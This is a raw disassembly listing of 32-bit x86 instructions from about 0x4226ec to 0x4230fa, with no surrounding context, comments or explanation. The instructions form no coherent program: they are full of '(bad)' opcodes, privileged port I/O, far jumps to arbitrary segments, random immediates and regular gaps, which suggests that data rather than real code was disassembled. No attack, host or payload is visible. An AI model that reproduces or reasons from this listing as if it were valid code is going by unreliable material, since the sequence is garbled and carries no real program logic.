  4226ec:	or     ch,BYTE PTR [ecx]
  4226ee:	push   esi
  4226ef:	push   ebp
  4226f0:	cmp    BYTE PTR [eax+0x38c1b978],0xa0
  4226f7:	jle    0x42272f
  4226f9:	iret   
  4226fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226fb:	test   eax,0xe0a13cca
  422700:	fnstenv [ebx+ebp*1-0x104d115e]
  422707:	mov    dl,0x60
  422709:	lea    ebx,[edx]
  42270b:	cmp    al,0x1d
  42270d:	jnp    0x422786
  42270f:	lock add BYTE PTR [eax],al
	...
  422772:	add    BYTE PTR [eax],al
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x287f01c8
  422781:	sar    BYTE PTR [edi-0x28],0x48
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    al,0x1
  42278a:	add    BYTE PTR [eax],al
  42278c:	mov    ebx,0x85880992
  422791:	xchg   ecx,eax
  422792:	and    edi,DWORD PTR [edi+0x1d]
  422795:	jg     0x422748
  422797:	in     al,0x28
  422799:	or     al,BYTE PTR [eax]
  42279b:	mov    al,0x31
  42279d:	loop   0x4227b6
  42279f:	into   
  4227a0:	(bad)  
  4227a1:	stos   DWORD PTR es:[edi],eax
  4227a2:	rcl    BYTE PTR ds:0x5191547e,1
  4227a8:	dec    esi
  4227a9:	jmp    0x2ed0:0x336c55df
  4227b0:	mov    ebx,DWORD PTR [ebx-0x4c]
  4227b3:	neg    DWORD PTR [esi+0x10]
  4227b6:	mov    esi,0xa3a01b1a
  4227bb:	test   ecx,edi
  4227bd:	cmp    eax,0x1e7af4e3
  4227c2:	mov    ebp,0x1d79aeb
  4227c7:	aaa    
  4227c8:	mov    edi,0xd54fff95
  4227cd:	mov    cl,0xbe
  4227cf:	xor    ebp,DWORD PTR [edi+0x5b3feb77]
  4227d5:	stos   BYTE PTR es:[edi],al
  4227d6:	addr16 clc 
  4227d8:	inc    eax
  4227d9:	xor    bh,0x7a
  4227dc:	mov    esp,0xe5fc4bd5
  4227e1:	or     BYTE PTR [ecx+ecx*4-0x47],dl
  4227e5:	sub    DWORD PTR [eax-0x74b85e78],edx
  4227eb:	xlat   BYTE PTR ds:[ebx]
  4227ec:	mov    al,ds:0xf9d60f14
  4227f1:	xor    al,0x1b
  4227f3:	popa   
  4227f4:	sbb    eax,0xe2a135bf
  4227f9:	scas   eax,DWORD PTR es:[edi]
  4227fa:	sbb    DWORD PTR [edx+eiz*2],eax
  4227fd:	es lahf 
  4227ff:	dec    eax
  422800:	inc    esi
  422801:	call   0x2d467770
  422806:	jne    0x422848
  422808:	jmp    0x422829
  42280a:	pop    edx
  42280b:	enter  0xb86f,0x39
  42280f:	add    ah,BYTE PTR ds:0x759f0118
  422815:	adc    ch,BYTE PTR [ecx+0x1e5fee27]
  42281b:	lds    esi,FWORD PTR [edi-0x64]
  42281e:	sar    BYTE PTR [ecx+0x15],1
  422821:	pop    es
  422822:	aad    0xa
  422824:	mov    bh,BYTE PTR [edi]
  422826:	mov    ah,bh
  422828:	mov    dh,0x62
  42282a:	sahf   
  42282b:	push   edi
  42282c:	adc    ebp,DWORD PTR [eax-0x6449c999]
  422832:	jne    0x4227c8
  422834:	jg     0x422896
  422836:	daa    
  422837:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422838:	xor    edi,DWORD PTR [edx+0xed508ca]
  42283e:	inc    edx
  42283f:	adc    bl,BYTE PTR [ebx+0x39]
  422842:	popa   
  422843:	adc    ch,BYTE PTR [si+0x600]
  422848:	sub    BYTE PTR [esi-0x2c],dh
  42284b:	dec    esi
  42284c:	aas    
  42284d:	stos   DWORD PTR es:[edi],eax
  42284e:	outs   dx,DWORD PTR ds:[esi]
  42284f:	dec    ebx
  422850:	jge    0x422845
  422852:	sub    dh,BYTE PTR [ebp-0x12]
  422855:	cmp    eax,0x7a720a70
  42285a:	mov    dh,0x87
  42285c:	add    esi,DWORD PTR [edi]
  42285e:	jne    0x422889
  422860:	xchg   ecx,eax
  422861:	(bad)  
  422862:	div    ebx
  422864:	icebp  
  422865:	int    0x21
  422867:	bound  edi,QWORD PTR [edi-0x7d]
  42286a:	push   ebp
  42286b:	inc    ecx
  42286c:	imul   BYTE PTR [eax*1-0x37db3b2a]
  422873:	jg     0x4228cb
  422875:	adc    ah,dl
  422877:	out    0xb4,eax
  422879:	cmovae edx,DWORD PTR [edi]
  42287c:	jg     0x422895
  42287e:	into   
  42287f:	xor    DWORD PTR [edi],edi
  422881:	inc    edx
  422882:	add    eax,DWORD PTR [ebp+0x2d]
  422885:	inc    esi
  422886:	or     dl,BYTE PTR [eax+esi*2-0x3f]
  42288a:	jp     0x422860
  42288c:	fxch   st(4)
  42288e:	push   esp
  42288f:	and    BYTE PTR [eax],al
	...
  4228f1:	add    BYTE PTR [eax],al
  4228f3:	add    ch,cl
  4228f5:	cmp    DWORD PTR [eax-0x10680369],edi
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x422912
  422901:	mov    cl,0x9b
  422903:	push   0x4c
  422905:	jo     0x422908
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	and    ecx,edx
  42290e:	fisttp QWORD PTR [ecx+0x5c0211c5]
  422914:	aas    
  422915:	xchg   DWORD PTR [edx-0x65],ebp
  422918:	retf   
  422919:	jle    0x4228bd
  42291b:	ins    DWORD PTR es:[edi],dx
  42291c:	dec    edx
  42291d:	lods   al,BYTE PTR ds:[esi]
  42291e:	sbb    DWORD PTR [ebx-0x7d],esp
  422921:	sub    eax,0xa490507d
  422926:	dec    edx
  422927:	sub    BYTE PTR [ebx-0x8d2f708],bh
  42292d:	into   
  42292e:	ja     0x422917
  422930:	push   eax
  422931:	inc    ebp
  422932:	sub    al,0x12
  422934:	mov    ebp,DWORD PTR [esi]
  422936:	and    al,0xcb
  422938:	ja     0x422923
  42293a:	pushaw 
  42293c:	mov    ah,0xac
  42293e:	push   edx
  42293f:	mov    ecx,0x84913522
  422944:	adc    BYTE PTR es:[eax+0x51],al
  422948:	(bad)
  42294b:	inc    ebx
  42294c:	stos   DWORD PTR es:[edi],eax
  42294d:	test   ecx,ebp
  42294f:	sbb    BYTE PTR [ecx-0xba3024e],bh
  422955:	das    
  422956:	push   edx
  422957:	rcl    DWORD PTR [eax],0xc8
  42295a:	add    ah,dh
  42295c:	inc    ebp
  42295d:	pusha  
  42295e:	push   ebx
  42295f:	push   esi
  422960:	mov    ecx,0x205d6f4e
  422965:	aam    0x57
  422967:	dec    edx
  422968:	or     al,0x95
  42296a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42296b:	dec    ebx
  42296c:	nop
  42296d:	sar    DWORD PTR [ebx],0x13
  422970:	push   cs
  422971:	sbb    DWORD PTR [edi-0x5a],edx
  422974:	jmp    0x4229ca
  422976:	push   ebx
  422977:	add    DWORD PTR [edx+0x39b1dffd],esi
  42297d:	add    ebx,ecx
  42297f:	aas    
  422980:	out    0xc4,eax
  422982:	enter  0xadc0,0xba
  422986:	xchg   esi,eax
  422987:	icebp  
  422988:	push   0x24
  42298a:	inc    DWORD PTR [ebp-0x12]
  42298d:	sub    DWORD PTR ds:0x3109ec14,ecx
  422993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422994:	xchg   ebx,eax
  422995:	or     dh,0xbc
  422998:	cmp    DWORD PTR [ebx],0xffffffc9
  42299b:	jns    0x4229af
  42299d:	ds clc 
  42299f:	les    esi,FWORD PTR [ecx-0x1e]
  4229a2:	out    dx,al
  4229a3:	aas    
  4229a4:	xor    esp,ebx
  4229a6:	pop    eax
  4229a7:	in     eax,0x55
  4229a9:	xorps  xmm3,XMMWORD PTR [ebp+0x6b]
  4229ad:	fist   WORD PTR [eax]
  4229af:	sub    ah,BYTE PTR [edi+0x530f2f07]
  4229b5:	std    
  4229b6:	push   eax
  4229b7:	mov    ah,0xd1
  4229b9:	dec    edi
  4229ba:	retf   
  4229bb:	stos   DWORD PTR es:[edi],eax
  4229bc:	sbb    DWORD PTR [edi-0x7a],eax
  4229bf:	(bad)  
  4229c0:	push   0x1b2697e8
  4229c5:	cs jae 0x422a40
  4229c8:	lds    eax,FWORD PTR [ebp*2-0x4f6b0b9b]
  4229cf:	sbb    BYTE PTR [edi+0x75e9c059],0xbc
  4229d6:	inc    esi
  4229d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229d8:	sub    BYTE PTR [ebx-0x43],bh
  4229db:	idiv   BYTE PTR [ebx-0xe639239]
  4229e1:	pop    edx
  4229e2:	imul   esp,ecx,0x93f2b8f7
  4229e8:	retf   0x1d62
  4229eb:	dec    ebx
  4229ec:	jg     0x422a03
  4229ee:	or     BYTE PTR [ebp-0x1d],al
  4229f1:	lods   eax,DWORD PTR ds:[esi]
  4229f2:	mov    BYTE PTR [edi+0x6c],bl
  4229f5:	fadd   st(2),st
  4229f7:	(bad)  [edx]
  4229f9:	pop    eax
  4229fa:	jb     0x422a68
  4229fc:	fidiv  DWORD PTR [esi+0x54]
  4229ff:	test   BYTE PTR [eax+0x18a5057e],ah
  422a05:	jne    0x4229ea
  422a07:	add    DWORD PTR [edi-0x12],esp
  422a0a:	stos   DWORD PTR es:[edi],eax
  422a0b:	ret    0x2128
  422a0e:	out    0xd5,al
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	pop    ecx
  422a81:	adc    eax,DWORD PTR [ecx+0x171501b]
  422a87:	add    BYTE PTR [ecx+eax*1],al
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	imul   edx,DWORD PTR [ecx-0x56],0x23
  422a90:	xchg   edi,eax
  422a91:	adc    ebp,DWORD PTR [eax-0x62]
  422a94:	aas    
  422a95:	gs in  al,dx
  422a97:	pop    edx
  422a98:	fmul   DWORD PTR [ebp+0x6e]
  422a9b:	not    ebx
  422a9d:	push   ds
  422a9e:	shl    DWORD PTR [esi],0xf3
  422aa1:	rcl    ebx,1
  422aa3:	inc    eax
  422aa4:	clc    
  422aa5:	sbb    cl,BYTE PTR [edi]
  422aa7:	xor    ebp,edi
  422aa9:	mov    ebx,ebx
  422aab:	cwde   
  422aac:	test   eax,0x2d2f3922
  422ab1:	cld    
  422ab2:	and    al,0xa7
  422ab4:	push   eax
  422ab5:	int    0x4
  422ab7:	sub    ah,BYTE PTR [edx+ebp*1+0x79c29220]
  422abe:	aas    
  422abf:	fstp   DWORD PTR [eax+0x6b]
  422ac2:	push   ss
  422ac3:	int3   
  422ac4:	jge    0x422a78
  422ac6:	jno    0x422a68
  422ac8:	in     eax,0x7d
  422aca:	ds sbb al,0x6c
  422acd:	push   ds
  422ace:	lods   eax,DWORD PTR ds:[esi]
  422acf:	inc    ebp
  422ad0:	imul   ebp,DWORD PTR [ecx+0x2a],0x73f261d2
  422ad7:	stos   DWORD PTR es:[edi],eax
  422ad8:	aas    
  422ad9:	fstp   QWORD PTR [eax-0x31]
  422adc:	outs   dx,DWORD PTR ds:[esi]
  422add:	sub    eax,DWORD PTR [edi+0x1]
  422ae0:	inc    edx
  422ae1:	xlat   BYTE PTR ds:[ebx]
  422ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ae3:	adc    eax,0x37926421
  422ae8:	push   cs
  422ae9:	xor    eax,DWORD PTR [esi+ebp*8]
  422aec:	in     eax,dx
  422aed:	add    al,0xe
  422aef:	or     DWORD PTR [ebx+ebx*2+0x5a221656],0x27803f5
  422afa:	xchg   esp,eax
  422afb:	dec    eax
  422afc:	mov    ah,0xdc
  422afe:	or     BYTE PTR [ecx+0x7d],ah
  422b01:	stc    
  422b02:	cmp    eax,0x36f980cb
  422b07:	jno    0x422b11
  422b09:	add    bl,ch
  422b0b:	push   eax
  422b0c:	dec    esp
  422b0d:	outs   dx,BYTE PTR ds:[esi]
  422b0e:	jle    0x422b6e
  422b10:	xor    DWORD PTR [eax-0x6a1ebc15],eax
  422b16:	aad    0xe9
  422b18:	sbb    eax,0x3d161995
  422b1d:	ror    BYTE PTR [edx],0x99
  422b20:	push   esi
  422b21:	mov    ds:0xefc01546,al
  422b26:	bound  edi,QWORD PTR ds:0xf528ce30
  422b2c:	jge    0x422ae9
  422b2e:	push   ebp
  422b2f:	in     al,0x64
  422b31:	xchg   edi,eax
  422b32:	rol    BYTE PTR [edx+ebp*1],0x91
  422b36:	jb     0x422b31
  422b38:	dec    edi
  422b39:	int3   
  422b3a:	sbb    al,0x18
  422b3c:	cmp    eax,0x9d0d57d
  422b41:	pop    eax
  422b42:	aas    
  422b43:	xchg   BYTE PTR [ebx+eiz*8-0x1dc9faae],bl
  422b4a:	push   edi
  422b4b:	in     eax,0x34
  422b4d:	data16 cmp bl,BYTE PTR [ebx]
  422b50:	jb     0x422af5
  422b52:	cmp    eax,0xce8b3629
  422b57:	pop    edi
  422b58:	gs cld 
  422b5a:	out    dx,al
  422b5b:	shl    cl,cl
  422b5d:	or     eax,0x599b611b
  422b62:	jecxz  0x422b05
  422b64:	ret    
  422b65:	push   0xad2b3032
  422b6a:	push   cs
  422b6b:	add    eax,DWORD PTR [ecx+0x4413b5de]
  422b71:	pushf  
  422b72:	dec    edx
  422b73:	(bad)  
  422b74:	and    BYTE PTR [esi+0x26],dh
  422b77:	(bad)  
  422b78:	into   
  422b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b7a:	and    BYTE PTR [edi-0x40],0x1b
  422b7e:	pop    esi
  422b7f:	add    eax,0x7d1e9e38
  422b84:	inc    ecx
  422b85:	pop    edx
  422b86:	mov    bh,0x28
  422b88:	push   ss
  422b89:	popf   
  422b8a:	pop    ebx
  422b8b:	mov    al,ds:0xea5ccf0e
	...
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx+0x1a234d9c]
  422c02:	aam    0xe4
  422c04:	push   esp
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	ds cdq 
  422c0e:	scas   al,BYTE PTR es:[edi]
  422c0f:	and    eax,0x87acfe23
  422c14:	loope  0x422c84
  422c16:	jmp    0x422bca
  422c18:	lea    esi,[edi-0x3dea61c6]
  422c1e:	rol    BYTE PTR [edi+0x2949a53c],cl
  422c24:	inc    edx
  422c25:	mov    esi,DWORD PTR [ecx*4-0x39c038b1]
  422c2c:	xor    BYTE PTR [eax],bl
  422c2e:	out    0x5f,al
  422c30:	clc    
  422c31:	push   edx
  422c32:	stc    
  422c33:	mov    esi,0xaa9f2e75
  422c38:	xlat   BYTE PTR ds:[ebx]
  422c39:	outs   dx,DWORD PTR ds:[esi]
  422c3a:	jns    0x422bf8
  422c3c:	(bad)  
  422c3d:	int    0x6f
  422c3f:	fmul   st(1),st
  422c41:	outs   dx,DWORD PTR ds:[esi]
  422c42:	push   edx
  422c43:	mov    ds:0x2ab75a8b,eax
  422c48:	cdq    
  422c49:	ss cld 
  422c4b:	loop   0x422c7c
  422c4d:	mov    edi,0x6714b8d5
  422c52:	add    al,0xde
  422c54:	aad    0xdf
  422c56:	push   edi
  422c57:	mov    ah,0x62
  422c59:	pop    ds
  422c5a:	hlt    
  422c5b:	mov    al,ds:0x4db27770
  422c60:	mov    DWORD PTR [ecx],edi
  422c62:	adc    cl,al
  422c64:	or     DWORD PTR [edx],eax
  422c66:	dec    edx
  422c67:	pusha  
  422c68:	test   DWORD PTR [ebx],esi
  422c6a:	inc    edi
  422c6b:	bound  eax,QWORD PTR [esi+0x39a0cc7a]
  422c71:	inc    eax
  422c72:	mov    bh,0x99
  422c74:	mov    eax,ds:0x930b4a7f
  422c79:	in     al,0x45
  422c7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c7c:	mov    ah,0xad
  422c7e:	dec    edi
  422c7f:	int3   
  422c80:	clc    
  422c81:	addr16 aaa 
  422c83:	addr16 xchg edx,eax
  422c85:	mov    esp,0x8facdf6e
  422c8a:	aad    0xc4
  422c8c:	test   DWORD PTR [ebx],0xd8251178
  422c92:	ret    0xc760
  422c95:	mov    BYTE PTR [esi],bl
  422c97:	pop    ss
  422c98:	pop    esp
  422c99:	fwait
  422c9a:	arpl   bp,sp
  422c9c:	lock push ebx
  422c9e:	imul   ecx,DWORD PTR [edx],0x234718d5
  422ca4:	xchg   ecx,eax
  422ca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ca6:	shl    DWORD PTR [edi+0x5d],0x72
  422caa:	mov    edx,0x61546e67
  422caf:	push   ss
  422cb0:	sub    eax,0x442228d
  422cb5:	gs pop ecx
  422cb7:	mov    DWORD PTR [esi-0xd],esp
  422cba:	cmp    esp,DWORD PTR [ebx+0x79]
  422cbd:	push   ss
  422cbe:	cli    
  422cbf:	sub    eax,0x3fe85534
  422cc4:	out    0x79,al
  422cc6:	sti    
  422cc7:	das    
  422cc8:	sbb    ah,dh
  422cca:	je     0x422ca3
  422ccc:	addr16 mov bl,0x8f
  422ccf:	add    eax,0x3a3b2fe6
  422cd4:	cmp    bl,BYTE PTR [ebp-0x48ae8a15]
  422cda:	nop
  422cdb:	ficomp WORD PTR [ecx]
  422cdd:	adc    DWORD PTR [ebx+esi*8+0xc],eax
  422ce1:	lea    esp,[ebx]
  422ce3:	adc    ecx,DWORD PTR [ebp+ecx*8+0x70a62910]
  422cea:	pop    esp
  422ceb:	ja     0x422caa
  422ced:	dec    esp
  422cee:	ret    
  422cef:	js     0x422d05
  422cf1:	sub    BYTE PTR [ebp+ebp*2-0x7d],0x5
  422cf6:	xchg   ecx,eax
  422cf7:	cwde   
  422cf8:	sar    DWORD PTR [ebp-0x224a2576],1
  422cfe:	push   esp
  422cff:	add    eax,DWORD PTR [esi-0x4f]
  422d02:	ins    DWORD PTR es:[edi],dx
  422d03:	mov    edx,0x12ab5888
  422d08:	outs   dx,DWORD PTR ds:[esi]
  422d09:	inc    esi
  422d0a:	loop   0x422cf8
  422d0c:	xor    bl,BYTE PTR [edx]
  422d0e:	in     al,0xc3
	...
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    eax,DWORD PTR ds:0x58f1c100
  422d85:	jae    0x422d88
  422d87:	add    BYTE PTR [ecx+eax*1],al
  422d8a:	add    BYTE PTR [eax],al
  422d8c:	outs   dx,DWORD PTR ds:[esi]
  422d8d:	adc    ah,BYTE PTR [edi+0x4b]
  422d90:	jae    0x422dce
  422d92:	sub    eax,0xf1ee9e37
  422d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d98:	mov    eax,ds:0x6947b1da
  422d9d:	inc    esi
  422d9e:	push   ss
  422d9f:	loop   0x422dd4
  422da1:	mov    edx,0x65e95007
  422da6:	cs out dx,eax
  422da8:	pop    eax
  422da9:	jb     0x422d43
  422dab:	push   es
  422dac:	xchg   edi,eax
  422dad:	xchg   BYTE PTR [eax-0x68],dl
  422db0:	(bad)  
  422db2:	pop    ecx
  422db3:	mov    cl,0x9b
  422db5:	mov    ebx,0x7908b1a3
  422dba:	dec    esp
  422dbb:	sar    DWORD PTR gs:[esi],0xb7
  422dbf:	sahf   
  422dc0:	or     al,0x7b
  422dc2:	or     eax,0x38337fd9
  422dc7:	mov    edi,0x6c6a9bd3
  422dcc:	or     BYTE PTR [edx+0x49],cl
  422dcf:	mov    cl,0xd1
  422dd1:	adc    DWORD PTR [ebx-0x43],edx
  422dd4:	xchg   edx,eax
  422dd5:	push   esi
  422dd6:	dec    edi
  422dd7:	xor    esp,DWORD PTR [ebx+edi*1-0x2e]
  422ddb:	fdivr  DWORD PTR [ecx]
  422ddd:	aas    
  422dde:	outs   dx,BYTE PTR ds:[esi]
  422ddf:	sbb    eax,ebp
  422de1:	lahf   
  422de2:	add    edi,DWORD PTR [ecx+0x1da070a2]
  422de8:	push   eax
  422de9:	std    
  422dea:	adc    esp,ebp
  422dec:	in     eax,dx
  422ded:	dec    eax
  422dee:	hlt    
  422def:	or     eax,0x56fc98f3
  422df4:	call   0x6899:0x3c3a2de6
  422dfb:	lods   eax,DWORD PTR ds:[esi]
  422dfc:	or     al,BYTE PTR [esi-0x3dd71556]
  422e02:	iret   
  422e03:	and    cl,al
  422e05:	pop    ebp
  422e06:	popa   
  422e07:	repnz cmc 
  422e09:	clc    
  422e0a:	sbb    bl,BYTE PTR [edx+0x67]
  422e0d:	pop    ebx
  422e0e:	jmp    0x9359:0x35075a28
  422e15:	mov    ds:0x2c468742,eax
  422e1a:	out    0x5d,eax
  422e1c:	test   BYTE PTR [edi-0x51405659],cl
  422e22:	xchg   ebx,eax
  422e23:	pop    ebx
  422e24:	hlt    
  422e25:	popa   
  422e26:	cmp    DWORD PTR [edx-0x74],0xffffff82
  422e2a:	test   al,0xd
  422e2c:	mov    eax,0x2b58b8d3
  422e31:	div    bl
  422e33:	inc    edi
  422e34:	popa   
  422e35:	ss mov edx,0x93f990a8
  422e3b:	add    esi,DWORD PTR [ecx]
  422e3d:	mov    eax,ds:0xd7420461
  422e42:	dec    esp
  422e43:	imul   eax,DWORD PTR [esi],0xffffffab
  422e46:	ins    BYTE PTR es:[edi],dx
  422e47:	cmp    al,BYTE PTR [ebx+0x4357ff47]
  422e4d:	mov    BYTE PTR [ecx+edi*1],cl
  422e50:	mov    bl,0x43
  422e52:	in     al,dx
  422e53:	hlt    
  422e54:	pushf  
  422e55:	inc    ebp
  422e56:	cwde   
  422e57:	enter  0x5e96,0x1e
  422e5b:	mov    al,ds:0x6f2940b0
  422e60:	lahf   
  422e61:	fldcw  WORD PTR [edi+0x73a076ec]
  422e67:	mov    ah,0x81
  422e69:	lods   eax,DWORD PTR ss:[esi]
  422e6b:	fwait
  422e6c:	mov    dl,0x60
  422e6e:	es push 0x4b
  422e71:	lods   eax,DWORD PTR ds:[esi]
  422e72:	sbb    eax,0xb6616dc
  422e77:	pop    ecx
  422e78:	and    BYTE PTR [esp+ebp*1-0x35],bl
  422e7c:	push   ecx
  422e7d:	mov    edx,0xf6deb7f7
  422e82:	std    
  422e83:	aam    0x62
  422e85:	loope  0x422ec5
  422e87:	mov    edi,0xe1e8dd58
  422e8c:	jg     0x422ec1
  422e8e:	jle    0x422e34
	...
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0xdc1fca33
  422f02:	shl    DWORD PTR [eax+0x1745c],1
  422f08:	add    al,0x1
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	dec    ecx
  422f0d:	sti    
  422f0e:	pop    ecx
  422f0f:	mov    esp,0x29b5422b
  422f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f15:	mov    esi,0x5d2e8108
  422f1a:	fcom   st(5)
  422f1c:	cmp    BYTE PTR [ebx-0x6a],bh
  422f1f:	mov    eax,ds:0xce65adf6
  422f24:	shl    DWORD PTR ds:0x66f4883d,cl
  422f2a:	lods   eax,DWORD PTR ds:[esi]
  422f2b:	into   
  422f2c:	ins    DWORD PTR es:[edi],dx
  422f2d:	fsub   QWORD PTR [edx-0x73ce6961]
  422f33:	pop    esp
  422f34:	jbe    0x422ec0
  422f36:	push   ebx
  422f37:	cmp    eax,0x54adc918
  422f3c:	out    0x97,eax
  422f3e:	inc    edx
  422f3f:	aaa    
  422f40:	and    bh,BYTE PTR [ecx+0x146a0833]
  422f46:	inc    esp
  422f47:	je     0x422f97
  422f49:	or     edx,DWORD PTR [edi-0x3ab13f1f]
  422f4f:	adc    eax,0xf146733
  422f54:	xor    al,0x9f
  422f56:	popa   
  422f57:	shl    bh,1
  422f59:	push   edx
  422f5a:	pop    ds
  422f5b:	popa   
  422f5c:	push   ds
  422f5d:	ds xor eax,0x934a6ea0
  422f63:	xor    ecx,DWORD PTR [edx]
  422f65:	bound  ecx,QWORD PTR [ebp-0x2]
  422f68:	jns    0x422f03
  422f6a:	dec    ebp
  422f6b:	pop    ebx
  422f6c:	imul   esp,DWORD PTR [edx+0x123333d4],0x221b874d
  422f76:	icebp  
  422f77:	cmp    bl,BYTE PTR [esi]
  422f79:	outs   dx,DWORD PTR ds:[esi]
  422f7a:	(bad)  [ecx-0x80]
  422f7d:	cmp    al,0xf5
  422f7f:	push   cs
  422f80:	xchg   esi,eax
  422f81:	stos   DWORD PTR es:[edi],eax
  422f82:	sbb    BYTE PTR [ecx+0x11632104],bl
  422f88:	les    ecx,FWORD PTR [esi]
  422f8a:	fisub  DWORD PTR [edi-0x702c2a0a]
  422f90:	mov    dl,0xb
  422f92:	xor    ecx,DWORD PTR [ecx+edi*1+0xc]
  422f96:	sbb    ebp,DWORD PTR [ebx-0x60]
  422f99:	icebp  
  422f9a:	outs   dx,BYTE PTR ds:[esi]
  422f9b:	(bad)  
  422f9c:	ja     0x422f60
  422f9e:	jle    0x422fce
  422fa0:	add    BYTE PTR [ebx+0x25],cl
  422fa3:	sbb    eax,0x2cb38026
  422fa8:	or     DWORD PTR [edi+edi*8+0x36],ebx
  422fac:	mul    BYTE PTR [eax+edx*4]
  422faf:	dec    esp
  422fb0:	mov    WORD PTR [ecx],?
  422fb2:	xor    dl,BYTE PTR [esp+ebx*2-0x4b0b906]
  422fb9:	mov    dh,0xbc
  422fbb:	fxch   st(3)
  422fbd:	pop    ds
  422fbe:	stos   BYTE PTR es:[edi],al
  422fbf:	push   esi
  422fc0:	pop    ds
  422fc1:	sbb    ch,cl
  422fc3:	xlat   BYTE PTR ds:[ebx]
  422fc4:	inc    ecx
  422fc5:	adc    BYTE PTR [ecx],al
  422fc7:	rdpmc  
  422fc9:	retf   
  422fca:	xchg   ebp,eax
  422fcb:	mov    dh,0x26
  422fcd:	dec    edi
  422fce:	push   DWORD PTR [edx]
  422fd0:	xor    DWORD PTR [eax-0x6c73c43d],edi
  422fd6:	inc    ebx
  422fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fd8:	test   BYTE PTR ds:0xbccb89ad,dh
  422fde:	out    dx,eax
  422fdf:	scas   al,BYTE PTR es:[edi]
  422fe0:	in     al,0xa0
  422fe2:	fiadd  DWORD PTR [edi-0x28]
  422fe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fe6:	or     bl,BYTE PTR gs:[eax-0x3c93f385]
  422fed:	mov    al,0xf1
  422fef:	dec    esi
  422ff0:	div    BYTE PTR [edi+0x30]
  422ff3:	fimul  DWORD PTR [eax]
  422ff5:	sahf   
  422ff6:	jbe    0x422fb9
  422ff8:	imul   ecx,DWORD PTR [edx+0x15],0x4f
  422ffc:	out    dx,eax
  422ffd:	outs   dx,DWORD PTR ds:[esi]
  422ffe:	cmp    al,0xc1
  423000:	push   esi
  423001:	rcr    DWORD PTR [esi+0x38],cl
  423004:	jns    0x42305a
  423006:	jo     0x42305a
  423008:	cmp    ah,BYTE PTR [esp+eax*4]
  42300b:	push   ecx
  42300c:	adc    BYTE PTR [edi+0xcc91],0x0
	...
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ecx+eax*8+0x60f0dd7e],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	iret   
  42308d:	push   ecx
  42308e:	inc    ebp
  42308f:	inc    ecx
  423090:	out    0x18,al
  423092:	xchg   ecx,eax
  423093:	loopne 0x4230b6
  423095:	aad    0xfd
  423097:	addr16 sahf 
  423099:	jl     0x423089
  42309b:	jle    0x42302c
  42309d:	in     al,0xd4
  42309f:	xchg   ebp,eax
  4230a0:	jge    0x423062
  4230a2:	cmp    cl,BYTE PTR [edx+0x4e]
  4230a5:	jbe    0x4230af
  4230a7:	ficom  WORD PTR [ebp+0x5a]
  4230aa:	test   BYTE PTR [esi-0x5e],ah
  4230ad:	inc    ebp
  4230ae:	cmp    al,0x9
  4230b0:	call   0xc6ff4a53
  4230b5:	xchg   esp,eax
  4230b6:	leave  
  4230b7:	adc    esi,DWORD PTR [edi-0xe]
  4230ba:	iret   
  4230bb:	call   0xfff11d5c
  4230c0:	mov    esi,0xcdd4fbc0
  4230c5:	mov    edx,0xa58ec437
  4230ca:	push   ss
  4230cb:	in     eax,dx
  4230cc:	sbb    DWORD PTR [ebx],esp
  4230ce:	pop    ds
  4230cf:	(bad)  
  4230d0:	xor    al,0x9a
  4230d2:	add    eax,0x1e040c5a
  4230d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230d8:	rcr    BYTE PTR [eax-0x7e],0x6d
  4230dc:	sub    esp,DWORD PTR [eax+esi*1]
  4230df:	nop
  4230e0:	and    al,dl
  4230e2:	adc    DWORD PTR [edi+0x20],esp
  4230e5:	inc    ebx
  4230e6:	mov    bh,0x9f
  4230e8:	mov    ds:0x3e74c0e5,eax
  4230ed:	jl     0x42308c
  4230ef:	push   ss
  4230f0:	retf   
  4230f1:	add    al,0x2
  4230f3:	add    BYTE PTR [eax+0xc1713fc],bl
  4230f9:	sahf   
  4230fa:	rol    BYTE PTR [edx+0x211501d2],cl
